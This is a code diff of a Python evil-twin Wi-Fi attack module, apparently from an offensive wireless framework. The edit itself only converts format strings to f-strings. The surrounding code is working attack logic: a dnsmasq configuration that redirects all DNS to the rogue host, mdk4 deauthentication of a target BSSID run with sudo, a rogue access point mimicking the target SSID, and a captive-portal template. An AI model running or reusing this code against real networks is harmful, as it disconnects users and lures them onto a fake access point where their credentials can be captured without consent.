@@ -101,12 +101,12 @@ class Exploit(Exploit):
         """Start dnsmasq for DHCP + DNS redirect."""
         conf = Path(".tmp/dualband_dnsmasq.conf")
         conf.write_text(
-            "interface={iface}\n"
+            f"interface={self.rogue_interface}\n"
             "dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h\n"
             "dhcp-option=option:router,10.0.0.1\n"
             "dhcp-option=option:dns-server,10.0.0.1\n"
             "address=/#/10.0.0.1\n"
-            "log-queries\n".format(iface=self.rogue_interface),
+            "log-queries\n",
             encoding="utf-8",
         )
 
@@ -125,7 +125,7 @@ class Exploit(Exploit):
 
             cmd = ["sudo", "mdk4", self.deauth_interface, "d",
                    "-B", str(target_file), "-c", deauth_channel]
-            print_info("mdk4 deauth on ch {} via {}".format(deauth_channel, self.deauth_interface))
+            print_info(f"mdk4 deauth on ch {deauth_channel} via {self.deauth_interface}")
             try:
                 subprocess.run(cmd, check=False)
             except KeyboardInterrupt:
@@ -187,21 +187,19 @@ class Exploit(Exploit):
                 }
                 plan = ch_opt.optimize(scan_data)
                 print_info("ML Channel Plan:")
-                print_info("  Recommended ch: {} (confidence: {:.0%})".format(
-                    plan.channel, plan.confidence))
+                print_info(f"  Recommended ch: {plan.channel} (confidence: {plan.confidence:.0%})")
                 if plan.timing_windows:
-                    print_info("  Best timing: {}".format(plan.timing_windows[:2]))
+                    print_info(f"  Best timing: {plan.timing_windows[:2]}")
             except Exception as exc:
                 logger.debug("ML channel optimization failed: %s", exc)
 
         if self.dry_run:
             print_info("DRY RUN — Dual-Band Evil Twin")
-            print_info("Rogue AP: {} on {} (band {})".format(
-                self.target_ssid, self.rogue_interface, self.rogue_band))
+            print_info(f"Rogue AP: {self.target_ssid} on {self.rogue_interface} (band {self.rogue_band})")
             print_info("Deauth: {} on {} (band {})".format(
                 self.target_bssid, self.deauth_interface,
                 "5" if self.rogue_band == "2.4" else "2.4"))
-            print_info("Template: {}".format(self.template))
+            print_info(f"Template: {self.template}")
             return
 
         subprocess.run(["sudo", "ifconfig", self.rogue_interface, "10.0.0.1", "up"],
@@ -213,10 +211,8 @@ class Exploit(Exploit):
 
         print_success("Rogue AP '{}' running on {}".format(
             self.target_ssid or "FreeWiFi", self.rogue_interface))
-        print_info("Portal on http://10.0.0.1:{} (template: {})".format(
-            self.portal_port, self.template))
-        print_info("Deauthing {} on 5GHz channel {} via {}".format(
-            self.target_bssid, self.target_channel_5, self.deauth_interface))
+        print_info(f"Portal on http://10.0.0.1:{self.portal_port} (template: {self.template})")
+        print_info(f"Deauthing {self.target_bssid} on 5GHz channel {self.target_channel_5} via {self.deauth_interface}")
 
         try:
             self._deauth_loop()
